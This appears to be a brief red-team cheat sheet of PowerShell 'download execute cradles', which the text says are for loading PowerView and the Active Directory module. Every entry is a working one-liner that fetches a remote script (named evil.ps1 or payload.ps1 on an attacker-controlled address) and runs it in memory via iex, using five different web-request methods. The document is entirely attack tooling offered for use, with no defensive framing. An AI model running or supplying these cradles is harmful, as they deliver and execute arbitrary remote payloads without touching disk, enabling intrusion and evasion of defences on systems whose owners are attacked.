# Download execute cradle 
## Power View (PV) and the Active Directory Module discussed further on can be Downloaded and Executed with these methods.

```PowerShell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1') 
```

```PowerShell
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

## PSv3 onwards 
```PowerShell
iex (iwr 'http://192.168.230.1/evil.ps1') 
```

```PowerShell
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText 

```

```PowerShell
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1") 

$r = $wr.GetResponse() 

IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
